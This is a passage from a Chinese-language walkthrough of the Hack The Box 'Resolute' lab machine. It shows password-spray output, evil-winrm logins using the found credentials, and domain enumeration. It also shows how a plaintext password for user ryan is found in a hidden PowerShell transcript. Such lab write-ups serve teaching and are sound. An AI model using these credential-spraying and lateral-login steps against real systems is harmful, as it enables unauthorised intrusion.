class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\Administrator:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\Guest:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [+] megabank.<span class="hljs-keyword">local</span>\melanie:Welcome123! <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\zach:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\simon:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\naoki:Welcome123! STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>

<p>倒数第四条信息，看起来我获取的口令是与melanie匹配的。</p>
<h5 id="以melanie身份登录目标并获取user-txt："><a href="#以melanie身份登录目标并获取user-txt：" class="headerlink" title="以melanie身份登录目标并获取user.txt："></a>以melanie身份登录目标并获取user.txt：</h5><p>我可以试着去登录目标：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u melanie -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span><br><br>Evil-WinRM shell v3<span class="hljs-number">.3</span><br><br><span class="hljs-built_in">Warning</span>: Remote <span class="hljs-type">path</span> completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> unimplemented <span class="hljs-keyword">on</span> this machine<br><br>Data: <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">check</span> Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-<span class="hljs-type">path</span>-completion<br><br><span class="hljs-keyword">Info</span>: Establishing <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> remote endpoint<br><br>*Evil-WinRM* PS C:\Users\melanie\Documents&gt; <br></code></pre></td></tr></table></figure>

<p>我成功了，并且我获取到了user.txt：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; <span class="hljs-keyword">cd</span> <span class="hljs-string">../desktop</span><br>*Evil-WinRM* PS C:\Users\melanie\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\melanie\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        4/23/2022   2<span class="hljs-function">:16</span> AM             34 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\melanie\desktop&gt; type user.txt<br></code></pre></td></tr></table></figure>

<h5 id="域侦察："><a href="#域侦察：" class="headerlink" title="域侦察："></a>域侦察：</h5><p>当前用户没什么权限：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\melanie\desktop&gt; whoami /pirv<br><br><span class="hljs-section">PRIVILEGES INFORMATION</span><br><span class="hljs-section">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled<br><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\melanie\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>我可以看一眼详细信息：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\melanie&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">melanie</span><br><span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    melanie<br>Full Name<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last set            <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">4</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span> AM<br>Password required            Yes<br><span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes<br><br>Workstations allowed         All<br>Logon script<br><span class="hljs-keyword">User</span> <span class="hljs-title">profile</span><br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>      *Remote Management Use<br>Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\melanie&gt; <br></code></pre></td></tr></table></figure>

<p>没什么信息，我可以看一眼它的组信息：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\melanie&gt; whoami /groups<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span><br>-----------------<br><br><span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                                 <span class="hljs-keyword">Type</span>             SID          <span class="hljs-keyword">Attributes</span><br>========================================== ================ ============ ==================================================<br>Everyone                                   Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Remote Management Users            Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Users                              Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Pre-Windows <span class="hljs-number">2000</span> Compatible Access Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-2</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>  Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level     Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span><br>*Evil-WinRM* PS C:\Users\melanie&gt; <br></code></pre></td></tr></table></figure>

<p>没什么有用的，用户目录也没有什么有用的信息，在Users目录中会有一个ryan目录，该用户我觉得需要留意一下，最起码相比其他用户，这个用户是切切实实被用来登录过目标机器的：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle">*Evil-WinRM* PS C:\Users&gt; ls<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">43</span> AM                Administrator<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                melanie<br>d-r---       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">39</span> PM                <span class="hljs-keyword">Public</span><br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/27/</span><span class="hljs-number">2019</span>   <span class="hljs-number">7</span>:<span class="hljs-number">05</span> AM                ryan<br><br><br>*Evil-WinRM* PS C:\Users&gt; <br><br></code></pre></td></tr></table></figure>

<p>在根中，我发现了一些隐藏目录：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs awk">*Evil-WinRM* PS C:\&gt; ls<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">19</span> AM                PerfLogs<br>d-r---        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> PM                Program Files<br>d-----       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">36</span> PM                Program Files (x86)<br>d-r---        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                Users<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">5</span>:<span class="hljs-number">15</span> AM                Windows<br><br><br>*Evil-WinRM* PS C:\&gt; ls -force<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d--hs-        <span class="hljs-number">12</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">40</span> AM                <span class="hljs-variable">$RECYCLE</span>.BIN<br>d--hsl        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">17</span> AM                Documents and Settings<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">19</span> AM                PerfLogs<br>d-r---        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> PM                Program Files<br>d-----       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">36</span> PM                Program Files (x86)<br>d--h--        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">48</span> AM                ProgramData<br>d--h--        <span class="hljs-number">12</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> AM                PSTranscripts<br>d--hs-        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">17</span> AM                Recovery<br>d--hs-        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">25</span> AM                System Volume Information<br>d-r---        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                Users<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">5</span>:<span class="hljs-number">15</span> AM                Windows<br>-arhs-       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">5</span>:<span class="hljs-number">59</span> PM         <span class="hljs-number">389408</span> bootmgr<br>-a-hs-        <span class="hljs-number">7</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">10</span> AM              <span class="hljs-number">1</span> BOOTNXT<br>-a-hs-        <span class="hljs-number">4</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">15</span> AM      <span class="hljs-number">402653184</span> pagefile.sys<br><br><br>*Evil-WinRM* PS C:\&gt; <br></code></pre></td></tr></table></figure>

<p>PSTranscripts可不像是一个计算机本该有的目录，在它下边确实会有一个隐藏目录：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\&gt; <span class="hljs-keyword">cd</span> PSTranscripts<br>*Evil-WinRM* PS C:\PSTranscripts&gt; <span class="hljs-keyword">ls</span><br>*Evil-WinRM* PS C:\PSTranscripts&gt; <span class="hljs-keyword">ls</span> -force<br><br><br>    Directory: C:\PSTranscripts<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>d<span class="hljs-params">--h--</span>        12/3/2019   6<span class="hljs-function">:45</span> AM                20191203<br><br>*Evil-WinRM* PS C:\PSTranscripts&gt; <br></code></pre></td></tr></table></figure>

<p>在隐藏目录中还会有一个隐藏文本文件：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">cd</span> <span class="hljs-number">20191203</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">dir</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">ls</span> <span class="hljs-operator">-</span><span class="hljs-variable">force</span><br><br><br>    <span class="hljs-built_in">Directory</span><span class="hljs-operator">:</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><br><br><br><span class="hljs-built_in">Mode</span>                <span class="hljs-variable">LastWriteTime</span>         <span class="hljs-built_in">Length</span> <span class="hljs-variable">Name</span><br><span class="hljs-operator">----</span>                <span class="hljs-operator">-------------</span>         <span class="hljs-operator">------</span> <span class="hljs-operator">----</span><br><span class="hljs-operator">-</span><span class="hljs-variable">arh</span><span class="hljs-operator">--</span>        <span class="hljs-number">12</span><span class="hljs-operator">/</span><span class="hljs-number">3</span><span class="hljs-operator">/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span><span class="hljs-operator">:</span><span class="hljs-number">45</span> <span class="hljs-variable">AM</span>           <span class="hljs-number">3732</span> <span class="hljs-type">PowerShell_transcript</span><span class="hljs-operator">.</span><span class="hljs-variable">RESOLUTE</span><span class="hljs-operator">.</span><span class="hljs-variable">OJuoBGhU</span><span class="hljs-number">.20191203063201</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure>

<p>我可以试着去看一眼，我删除了一些不必要的：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><br><span class="hljs-comment">**********************</span><br>Windows PowerShell transcript start<br>Start time: 20191203063201<br>Username: MEGABANK\ryan<br>RunAs User: MEGABANK\ryan<br>......<br>Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding<br>......<br><span class="hljs-comment">**********************</span><br><span class="hljs-comment">**********************</span><br>......<br>PS&gt;CommandInvocation(Invoke-Expression): <span class="hljs-string">&quot;Invoke-Expression&quot;</span><br>&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="hljs-string">&quot;Command&quot;</span>; value=&quot;cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br><br>......<br>+ cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (The <span class="hljs-keyword">syntax</span> of this command is::String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>cmd : The <span class="hljs-keyword">syntax</span> of this command is:<br>At <span class="hljs-keyword">line</span>:1 <span class="hljs-keyword">char</span>:1<br>+ cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (The <span class="hljs-keyword">syntax</span> of this command is::String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>......<br><span class="hljs-comment">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt;</span><br></code></pre></td></tr></table></figure>

<p>文本里边多次提到一个看起来像是一串密码的字符串”<strong>Serv3r4Admin4cc123!</strong>“,还有用户”<strong>ryan</strong>“。</p>
<h5 id="以ryan身份登录："><a href="#以ryan身份登录：" class="headerlink" title="以ryan身份登录："></a>以ryan身份登录：</h5><p>我可以试着用ryan登录：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u ryan -p Serv3r4Admin4cc123!                      <br><br>Evil-WinRM shell v3<span class="hljs-number">.3</span><br><br><span class="hljs-built_in">Warning</span>: Remote <span class="hljs-type">path</span> completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> unimplemented <span class="hljs-keyword">on</span> this machine<br><br>Data: <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">check</span> Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-<span class="hljs-type">path</span>-completion<br><br><span class="hljs-keyword">Info</span>: Establishing <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> remote endpoint<br><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <br></code></pre></td></tr></table></figure>

<p>在ryan桌面有个笔记，里边记载了一些信息：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; ls<br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-comment">----                -------------         ------ ----</span><br>-ar<span class="hljs-comment">---        12/3/2019   7:34 AM            155 note.txt</span><br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; type note.txt<br>Email <span class="hljs-built_in">to</span> team:<br><br>- due <span class="hljs-built_in">to</span> change freeze, <span class="hljs-keyword">any</span> <span class="hljs-keyword">system</span> changes (apart <span class="hljs-built_in">from</span> those <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> administrator account) will be automatically reverted <span class="hljs-keyword">within</span> <span class="hljs-number">1</span> minute<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>由于变更冻结的原因，系统变更(除管理员账户变更外)会在1分钟内自动恢复。算是一个提醒，但对于当下的我还没明白它对我有什么利弊。</p>
<p>当前用户没什么特殊权限：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\ryan\desktop&gt; whoami /priv<br><br><span class="hljs-section">PRIVILEGES INFORMATION</span><br><span class="hljs-section">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled<br></code></pre></td></tr></table></figure>

<p>我可以看一下它的具体信息：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">ryan</span><br><span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    ryan<br>Full Name                    Ryan Bertrand<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last set            <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">4</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> AM<br>Password required            Yes<br><span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes<br><br>Workstations allowed         All<br>Logon script<br><span class="hljs-keyword">User</span> <span class="hljs-title">profile</span><br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span><br>Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users         *Contractors<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>它并不在远程管理组中，那为什么我能远程登录到它呢？</p>
